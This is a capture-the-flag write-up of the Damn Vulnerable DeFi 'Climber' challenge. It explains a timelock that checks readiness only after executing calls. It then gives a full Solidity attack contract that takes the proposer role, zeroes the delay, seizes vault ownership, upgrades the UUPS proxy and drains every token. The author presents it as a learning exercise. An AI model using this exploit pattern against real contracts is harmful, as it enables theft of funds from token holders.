# Damn Vulnerable Token 12: Climber

Learn about the UUPS pattern. Study a lot of code, where a vault has many tokens and a timelock allows to withdraw 1 token every 15 days. See a vulnerabilty and exploit it. Learn to use many steps to reach the exploit goal.

## The Task Intro

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.

The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.

On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

To pass this challenge, take all tokens from the vault.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/climber)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/climber/climber.challenge.js)

## The Solution

I realize I achieve the end of the rareskills bootcamp, because tasks get more and more difficult and the next step seems to be production code :-). This time it is about UUPS pattern, but just to understand what the code does it takes time. I learned, it is important to focus first on the code itself and what the authors wanted to achieve. When I felt safe with the code, I started to spot for vulnerabilities activly.

What is happening in this exercise? The Vault itself was not difficult to understand - it is behind a proxy and all upgrade functions are on the implementation itself. The proxy and on the implementation are inizialized. To take all tokens of the contract, I have to:

- Become the owner of the Vault and upgrade the proxy to a new implementation, that allows to transfer all tokens
- The vault has a sweeper role, that in an emergency can transfer all tokens to another address

To become a sweeper seems difficult, because there are no storage conflicts I can exploit and there is no setter for the sweeper. My work hypothesis is to become an owner.

This would be possible, if I could schedule and execute a call to the vault `transferOwner` function. But to make that work I need to be able to execute a function on the time lock.

Studing the timelock I find a 2 layer excecution model with permissions. A proposer schedules certain tasks, but everybody can execute the tasks one hour later. That makes the execution task an obvious candidate for exploitation. I studied the AccessControl contract from OpenZeppelin with roles and granting access to it. I realize that the timelock itself is an administrator, making it possible that it can give roles to other people. A vulnerability, which makes the exploit of transferOwner very possible, if I can execute a call in the name of the timelock. The excecute function of the timelock contract first interacts and then it checks. This allows us a reentrency attack:

````apache
....

for (uint8 i = 0; i < targets.length; ) {
    targets[i].functionCallWithValue(dataElements[i], values[i]);
    unchecked {
        ++i;
    }
}

if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}

....
```
````

A messup with the Checks-Effect-Interaction pattern:

> [Use the Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern "Permalink to this heading")
>
> Most functions will first perform some checks (who called the function, are the arguments in range, did they send enough Ether, does the person have tokens, etc.). These checks should be done first.
>
> As the second step, if all checks passed, effects to the state variables of the current contract should be made. Interaction with other contracts should be the very last step in any function.
>
> Early contracts delayed some effects and waited for external function calls to return in a non-error state. This is often a serious mistake because of the re-entrancy problem explained above.
>
> Note that, also, calls to known contracts might in turn cause calls to unknown contracts, so it is probably better to just always apply this pattern.

To create an attack I need to follow these steps:

- Grant me the propose role
- Set the delay of 1 hour to 0, so I can execute this contract immediately
- Make me owner of the vault
- Schedule this task so it is executed

Here began the very confusing part of my work on this challenge. How to set up this attack? I use hardhat in a VisualCode environment. I prefer to code in solitiy. Therefore I create a attacker contract and just call it from the javascript test, which looks as follows:

```apache
....

let attackerFactory = await ethers.getContractFactory('AttackClimber', player);
let attacker = await attackerFactory.deploy(vault.address, await vault.owner(), token.address, player.address);
await attacker.deployed();
await attacker.attack();
console.log('Attacker address: ', player.address);

....
```

This code deploys the AttackerClimber contract with the address of the vault, timelock, token and player/attacker, as a help logs the attacker/player contract.

With that setup in mind I started to create the solidity attack contract with the parameters for the execute function - first grant access to the proposer role on the timelock, then update the delay to 0 seconds on the timelock and transfer the ownership to my attacker contract:

```àpache
// attack to achive the role of the proposer for the timelock and the owner of the vault
targets = new address[](4);
values = new uint256[](4);
data = new bytes[](4);

//make the attacker contract the role of the proposer for the timelock
targets[0] = address(timelock);
values[0] = 0;
data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

//set the delay of the timelock to 0, so we can execute the calls immediately
targets[1] = address(timelock);
values[1] = 0;
data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

//make the attacker contract the owner of the vault
targets[2] = address(vault);
values[2] = 0;
data[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
```

But how to pass the test `(getOperationState(id) != OperationState.ReadyForExecution)` in the execution function? It comes after the functioncall. If it would be before the function call, the attack above would be impossible. Still I need to pass the test.

```àpache

```

So it is obvious to schedule the task myself. Here I lost quite some time, because I wanted to make a call like this:

```àppache
....

targets[3] = address(timelock);
values[3] = 0;
data[3] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", targets,values,data,"0x0");

....
```

But it did not work!!! Why? The data value of the schedule function is not added in the data array and I create the signature. When I calculate the keccac256 with the execute function, that value is added. I have two different hashes, what makes this appoach useless. It took me quite some time to realize that there is no way to make that approach work.

My solution then was to create another function in the attack contract that calculates the hash and calls the timelock's schedule function from this function ;-) Hey creative isn't it? But I needed as well help coming up with this! Alone probably this would have taken hours or days more.

With this the exploit was almost finished. My smart contract was proposer of the timelock contract and owner of the vault. To exploit I needed another contract I can upgrade to, and transfer all tokes to the attackes address. Here the full attacker contract:

```àpache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../ClimberVault.sol";
import "../ClimberTimelock.sol";
import "../../DamnValuableToken.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {PROPOSER_ROLE} from "../ClimberConstants.sol";
import "hardhat/console.sol";

contract ClimberNewVolt is ClimberVault {
    using SafeTransferLib for address;

    function withdrawAll(DamnValuableToken token, address attacker, uint256 amount) external {
        //token.transfer(attacker, amount);
        SafeTransferLib.safeTransfer(address(token), attacker, amount);
    }
}

contract AttackClimber {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address attacker;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _attacker) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        attacker = _attacker;
    }

    function attack() external {
        //log addresses
        console.log("Attack Contract address: %s", address(this));
        console.log("Attacker address: %s", attacker);
        console.log("Vault address: %s", address(vault));
        console.log("Timelock address: %s", address(timelock));

        //attack execute function in ClimberTimeLock
        (address[] memory targets, uint256[] memory values, bytes[] memory data) = getParameters();
        timelock.execute(targets, values, data, "0x0");

        //check if the contract is in the role of proposer for the timelock and is owner of the vault
        bool hasRole = timelock.hasRole(PROPOSER_ROLE, address(this));
        address owner = vault.owner();
        console.log("Contract has proposer role: %s", hasRole);
        console.log("Vault owner: %s", owner);
        console.log("Vault balance: %s", token.balanceOf(address(vault)));

        //Upgrate the vault and withdraw all tokens
        ClimberNewVolt newVault = new ClimberNewVolt();
        vault.upgradeTo(address(newVault));
        ClimberNewVolt(address(vault)).withdrawAll(token, attacker, token.balanceOf(address(vault)));

        //check if the attack was successful and the vault has no tokens, the attacker has all tokens
        console.log("Transfer happend");
        console.log("Vault balance: %s", token.balanceOf(address(vault)));
        console.log("Attacker balance: %s", token.balanceOf(attacker));
    }

    function scheduleOperation() external {
        //to successfully execute our calls, these calls must be scheduled.
        (address[] memory targets, uint256[] memory values, bytes[] memory data) = getParameters();
        timelock.schedule(targets, values, data, "0x0");
    }

    function getParameters() private view returns (address[] memory targets, uint256[] memory values, bytes[] memory data) {
        // attack to achive the role of the proposer for the timelock and the owner of the vault
        targets = new address[](4);
        values = new uint256[](4);
        data = new bytes[](4);

        //make the attacker contract the role of the proposer for the timelock
        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        //set the delay of the timelock to 0, so we can execute the calls immediately
        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        //make the attacker contract the owner of the vault
        targets[2] = address(vault);
        values[2] = 0;
        data[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));

        //Schedule the calls, that we are able to execute the calls. This is possible because of a reentrency bug in the timelock contract
        //the check for REadyForExecution should be before the execution of the calls, but it is after the execution of the calls
        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSignature("scheduleOperation()");
    }
}

```

## Conclusion

Done 🎉️ ! What a thing, working through this exercises is fun! My major lesson: Don't be worried when everything looks confusing. This is part of the coding work! It is a lot of material to digest. Read the code, understand what the author is trying to achieve. Make research on your questions or at least note them and make reaserch later. It is a puzzle, step by step. Use all the resources you have. AND RESIST TO JUMP to different task to often. Try to finish one piece after the other. If you on the wrong track, note it, move to the next that looks more promising. As a rule of thumb I stay in a confusing area for about 1 hour. In the worst case, I sleep over it and re-asses the next day.

In this challenge spotting the vulnerability in the timelock contract happend after understanding the access control and ownable openzeppelin contracts, confirming this with online solutions. Then writing the code itself was a piece of cake compared to the time understanding the contract. If no solutions are around you can compare with, ask chat-GPT or make little proof of concepts.

YEAH, I am proud I solved this one. If you read until here, congratulations, I bet you know now how to solve this task but as well have developed a feeling how to aproach other coding tasks.

In a way programming is a very fair dicipline, the more you code, the better you get. No unfair politics of somebody can change this. 🎉️
